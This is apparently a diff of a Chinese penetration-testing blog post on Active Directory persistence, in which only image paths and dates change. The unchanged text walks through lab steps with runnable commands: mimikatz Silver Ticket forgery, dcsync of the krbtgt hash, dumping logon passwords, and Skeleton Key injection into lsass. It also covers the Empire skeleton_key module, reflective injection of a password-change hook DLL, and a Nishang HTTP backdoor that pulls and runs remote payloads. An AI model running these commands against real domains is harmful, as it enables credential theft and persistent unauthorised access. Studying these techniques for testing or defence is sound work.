 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:DCSRV.Motoo.nc /sid:S-1-5-21-284927032-1122706408-2778656994 /target:MoToo-DCSRV.Motoo.nc /service:cifs /rc4:eabd9a2e3a1733bcc44120572b571ae8 /user:WebAdm /ptt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/37.png" alt></p>
+<p><img src="/2020/07/13/权限维持/37.png" alt></p>
 <p>验证去啊先，发现可以访问域控制器的共享目录了</p>
 <p><strong>2、实验：使用Silver Ticket伪造LDAP服务权限</strong></p>
 <p>使用dcsync从域控制器中获取指定用户的账号和密码散列值</p>
 <p>测试以当前权限是否可以使用dcsync与域控制器进行同步,发现失败，当前权限不能进行dcsync操作</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:dc.hacke.testlab /user:krbtgt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/40.png" alt></p>
+<p><img src="/2020/07/13/权限维持/40.png" alt></p>
 <p>在域控制器中使用mimikatz获取服务账号NTLM Hash</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使用log参数以便复制散列值</span><br><span class="line">mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure>
 
@@ -376,7 +376,7 @@
 <p>生成伪造的Silver Ticket ,在之前不能使用dcsync从域控制器获取krbtgt密码散列值的机器中输入如下命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:hacke.testlab /sid:S-1-5-21-3125703835-992822856-3564750058 /target:dc.hacke.testlab /service:LDAP /rc4:09bc0266e773764dc3606744ddbe133d /user:testuser /ptt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/39.png" alt></p>
+<p><img src="/2020/07/13/权限维持/39.png" alt></p>
 <p>使用dcsync在域控制器中茶轩krbtgt的密码散列值</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:dc.hacke.testlab /domain:hacke.testlab /user:krbtgt</span><br></pre></td></tr></table></figure>
 
@@ -408,15 +408,15 @@
 <p>尝试以当前登录用户身份列出域控制器<code>C盘</code>共享目录中的文件。因为此时使用的是一个普通域用户身份，所以系统提示权限不足</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.1.1\c$</span><br><span class="line">dir \\dc\c$</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/41.png" alt></p>
+<p><img src="/2020/07/13/权限维持/41.png" alt></p>
 <p>使用域管理员账号和密码进行连接</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.1\ipc$ &quot;Admin!@#$4321&quot; /user:hacke.testlab\administrator</span><br><span class="line">dir \\192.168.1.1\c$</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/42.png" alt></p>
+<p><img src="/2020/07/13/权限维持/42.png" alt></p>
 <p>在域控制器中以管理员权限打开<code>mimikatz</code>，分别输入如下命令，将<code>Skeleton Key</code>注入域控制器的<code>lsass.exe</code>进程</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/43.png" alt></p>
+<p><img src="/2020/07/13/权限维持/43.png" alt></p>
 <p>提示<code>Skeleton Key</code>已经注入成功。这时，会在域内的所有账号中添加一个<code>Skeleton Key</code>,其密码默认为<code>mimikatz</code>。接下来，就可以以域内任意用户的身份，配合该<code>Skeleton Key</code>，进行域内身份授权验证</p>
 <p>在不使用域管理员原始密码的情况下，使用注入的<code>Skeleton Key</code>,同样可以成功连接系统。</p>
 <p>先将之前建立的<code>ipc$</code>删除</p>
@@ -425,7 +425,7 @@
 <p>输入如下命令，使用域管理员账号和<code>Skeleton Key</code>与域控制器建立<code>ipc$</code>。成功建立连接，并列出了域控制器<code>C盘</code>的共享目录</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\dc\ipc$ &quot;mimikatz&quot; /user:hacke.testlab\administrator</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/44.png" alt></p>
+<p><img src="/2020/07/13/权限维持/44.png" alt></p>
 <p><strong>2.实验：在Empire中使用Skeleton Key</strong></p>
 <p>在获取一个<code>agent</code>的时,将<code>skeleton_key</code>注入后，Empire会提示可以使用密码<code>mimikatz</code>进入系统</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interact A93VXTMU //进入agent</span><br><span class="line">usemodule persistemce/misc/skeleton_key</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
@@ -450,17 +450,17 @@
 <p>参考链接:<a href="http://www.vuln.cn/6812" target="_blank" rel="noopener">域渗透——Hook PasswordChangeNotify – 三好学生</a></p>
 <p>poc下载地址：<a href="https://github.com/clymb3r/Misc-Windows-Hacking" target="_blank" rel="noopener">https://github.com/clymb3r/Misc-Windows-Hacking</a></p>
 <p>使用VS2019开发环境，MFC设置为在静态库中使用MFC编译工程，生成<code>HookPasswordChange.dll</code>,这里要选静态库中使用<code>MFC</code>，不然生成的dll会报错</p>
-<p><img src="/2020/10/26/权限维持/54.png" alt></p>
+<p><img src="/2020/07/13/权限维持/54.png" alt></p>
 <p>下载Powershell的dll注入脚本：</p>
 <p><a href="https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1</a></p>
 <p>在目标系统中启动管理员权限的Powershell使用 使用Invoke-ReflectivePEInjection.ps1注入HookPasswordChange.dll内存</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-ReflectivePEInjection.ps1</span><br><span class="line">Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll –procname lsass</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/55.png" alt></p>
+<p><img src="/2020/07/13/权限维持/55.png" alt></p>
 <p>在Server 2012 R2 x64下，手动修改域控密码后<br>在<code>C:\Windows\Temp</code>下可以找到<code>passwords.txt</code>，其中记录了新修改的密码。一种直接命令修改，另一种可在<code>Active Directory 用户和计算机</code>对用户进行重置密码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator Admin!@#123</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/10/26/权限维持/56.png" alt></p>
+<p><img src="/2020/07/13/权限维持/56.png" alt></p>
 <h4 id="Nishang下的脚本后门"><a href="#Nishang下的脚本后门" class="headerlink" title="Nishang下的脚本后门"></a>Nishang下的脚本后门</h4><h5 id="HTTP-Backdoor脚本"><a href="#HTTP-Backdoor脚本" class="headerlink" title="HTTP-Backdoor脚本"></a>HTTP-Backdoor脚本</h5><p>HTTP-Backdoor脚本可以在目标主机上下载和执行powershell脚本，接收来自第三方网站的指令，在内存中执行powershell脚本</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TTP-Backdoor -CheckURL http://pentest.com/test.php?id=1 -PayloadURL http://pentest.com/test.php?id=2 -MagicString start123 -StopString stopthis</span><br></pre></td></tr></table></figure>
 
@@ -496,7 +496,7 @@
 <p>参考资料</p>
 <p>内网安全攻防</p>
 <p>近源渗透测试</p>
-</div><!--文章标签--><div class="tags"><a href="/tags/内网渗透/">内网渗透</a></div><!--评论--></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" id="search" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"> 分类</div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a><span class="category-list-count">24</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞复现/">漏洞复现</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"> 标签</div><div class="tagcloud"><a href="/tags/命令执行/" style="font-size: 12px;">命令执行</a> <a href="/tags/代码执行/" style="font-size: 12px;">代码执行</a> <a href="/tags/远程代码执行/" style="font-size: 18px;">远程代码执行</a> <a href="/tags/权限提升/" style="font-size: 12px;">权限提升</a> <a href="/tags/文件读取/" style="font-size: 12px;">文件读取</a> <a href="/tags/Cobalt-Strike/" style="font-size: 13.5px;">Cobalt Strike</a> <a href="/tags/cobaltstrike/" style="font-size: 13.5px;">cobaltstrike</a> <a href="/tags/安全开发/" style="font-size: 12px;">安全开发</a> <a href="/tags/Ngrok/" style="font-size: 12px;">Ngrok</a> <a href="/tags/PowerShell/" style="font-size: 16.5px;">PowerShell</a> <a href="/tags/文件包含/" style="font-size: 12px;">文件包含</a> <a href="/tags/QCOW2/" style="font-size: 12px;">QCOW2</a> <a href="/tags/Vulnhub/" style="font-size: 12px;">Vulnhub</a> <a href="/tags/metasploit/" style="font-size: 15px;">metasploit</a> <a href="/tags/burpsuite/" style="font-size: 12px;">burpsuite</a> <a href="/tags/shell脚本/" style="font-size: 12px;">shell脚本</a> <a href="/tags/venom/" style="font-size: 12px;">venom</a> <a href="/tags/免杀/" style="font-size: 15px;">免杀</a> <a href="/tags/文件上传/" style="font-size: 12px;">文件上传</a> <a href="/tags/端口转发/" style="font-size: 12px;">端口转发</a> <a href="/tags/Bypass/" style="font-size: 12px;">Bypass</a> <a href="/tags/Covenant/" style="font-size: 12px;">Covenant</a> <a href="/tags/meterpreter/" style="font-size: 12px;">meterpreter</a> <a href="/tags/poc/" style="font-size: 12px;">poc</a> <a href="/tags/sqlmap/" style="font-size: 12px;">sqlmap</a> <a href="/tags/msfvenom/" style="font-size: 12px;">msfvenom</a> <a href="/tags/内网渗透/" style="font-size: 13.5px;">内网渗透</a> <a href="/tags/域信息收集/" style="font-size: 13.5px;">域信息收集</a> <a href="/tags/反序列化/" style="font-size: 12px;">反序列化</a></div></div><div class="widget"><div class="widget-title"> 最新文章</div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/10/26/权限维持/">权限维持</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/26/Cobalt-Strike添加UI/">Cobalt-Strike添加UI</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/24/sqlmapapi学习使用/">sqlmapapi学习使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/18/深信服EDR-RCE/">深信服EDR-RCE</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/09/BypassUAC方法论学习/">BypassUAC方法论学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/06/CVE-2020-5902-BIG-IP-RCE-复现/">CVE-2020-5902(BIG-IP RCE)复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/03/域控制器/">域控制器</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/30/域内横向移动二/">域内横向移动二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/27/域内横向移动一/">域内横向移动一</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/24/CobaltStrike二次开发环境准备/">CobaltStrike二次开发环境准备</a></li></ul></div><div class="widget"><div class="widget-title"> 友情链接</div><ul class="links-list"><li class="links-list-item"><a href="https://timeshu.github.io/" title="Time" target="_blank">Time</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://www.vkxss.top/" title="VK" target="_blank">VK</a></li></ul></div></div></div></div><div id="footer">© <a href="/." rel="nofollow">Guko's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a> Theme<a target="_blank" href="https://github.com/7ye/maupassant-hexo"> Maupassant.</a></div><a id="back_to_top" href="javascript:void(0)" class="back_to_top"><span>△</span></a><script type="text/javascript" src="/js/totop.js?v=0.0.1"></script><link rel="stylesheet" href="/css/jquery.fancybox.css"><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1"></script><script>function auto_code_fit(){
+</div><!--文章标签--><div class="tags"><a href="/tags/内网渗透/">内网渗透</a></div><!--评论--></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" id="search" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"> 分类</div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a><span class="category-list-count">24</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞复现/">漏洞复现</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"> 标签</div><div class="tagcloud"><a href="/tags/命令执行/" style="font-size: 12px;">命令执行</a> <a href="/tags/代码执行/" style="font-size: 12px;">代码执行</a> <a href="/tags/远程代码执行/" style="font-size: 18px;">远程代码执行</a> <a href="/tags/权限提升/" style="font-size: 12px;">权限提升</a> <a href="/tags/文件读取/" style="font-size: 12px;">文件读取</a> <a href="/tags/Cobalt-Strike/" style="font-size: 13.5px;">Cobalt Strike</a> <a href="/tags/cobaltstrike/" style="font-size: 13.5px;">cobaltstrike</a> <a href="/tags/安全开发/" style="font-size: 12px;">安全开发</a> <a href="/tags/Ngrok/" style="font-size: 12px;">Ngrok</a> <a href="/tags/PowerShell/" style="font-size: 16.5px;">PowerShell</a> <a href="/tags/文件包含/" style="font-size: 12px;">文件包含</a> <a href="/tags/QCOW2/" style="font-size: 12px;">QCOW2</a> <a href="/tags/Vulnhub/" style="font-size: 12px;">Vulnhub</a> <a href="/tags/metasploit/" style="font-size: 15px;">metasploit</a> <a href="/tags/burpsuite/" style="font-size: 12px;">burpsuite</a> <a href="/tags/shell脚本/" style="font-size: 12px;">shell脚本</a> <a href="/tags/venom/" style="font-size: 12px;">venom</a> <a href="/tags/免杀/" style="font-size: 15px;">免杀</a> <a href="/tags/文件上传/" style="font-size: 12px;">文件上传</a> <a href="/tags/端口转发/" style="font-size: 12px;">端口转发</a> <a href="/tags/Bypass/" style="font-size: 12px;">Bypass</a> <a href="/tags/Covenant/" style="font-size: 12px;">Covenant</a> <a href="/tags/meterpreter/" style="font-size: 12px;">meterpreter</a> <a href="/tags/poc/" style="font-size: 12px;">poc</a> <a href="/tags/sqlmap/" style="font-size: 12px;">sqlmap</a> <a href="/tags/msfvenom/" style="font-size: 12px;">msfvenom</a> <a href="/tags/内网渗透/" style="font-size: 13.5px;">内网渗透</a> <a href="/tags/域信息收集/" style="font-size: 13.5px;">域信息收集</a> <a href="/tags/反序列化/" style="font-size: 12px;">反序列化</a></div></div><div class="widget"><div class="widget-title"> 最新文章</div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/10/26/Cobalt-Strike添加UI/">Cobalt-Strike添加UI</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/24/sqlmapapi学习使用/">sqlmapapi学习使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/18/深信服EDR-RCE/">深信服EDR-RCE</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/13/权限维持/">权限维持</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/09/BypassUAC方法论学习/">BypassUAC方法论学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/06/CVE-2020-5902-BIG-IP-RCE-复现/">CVE-2020-5902(BIG-IP RCE)复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/03/域控制器/">域控制器</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/30/域内横向移动二/">域内横向移动二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/27/域内横向移动一/">域内横向移动一</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/24/CobaltStrike二次开发环境准备/">CobaltStrike二次开发环境准备</a></li></ul></div><div class="widget"><div class="widget-title"> 友情链接</div><ul class="links-list"><li class="links-list-item"><a href="https://timeshu.github.io/" title="Time" target="_blank">Time</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://www.vkxss.top/" title="VK" target="_blank">VK</a></li></ul></div></div></div></div><div id="footer">© <a href="/." rel="nofollow">Guko's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a> Theme<a target="_blank" href="https://github.com/7ye/maupassant-hexo"> Maupassant.</a></div><a id="back_to_top" href="javascript:void(0)" class="back_to_top"><span>△</span></a><script type="text/javascript" src="/js/totop.js?v=0.0.1"></script><link rel="stylesheet" href="/css/jquery.fancybox.css"><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1"></script><script>function auto_code_fit(){
   if($(".highlight").length != 0){
     var pc_width = $(".post-content").width();
     $(".highlight .code").find("pre").width((pc_width-70)+"px");
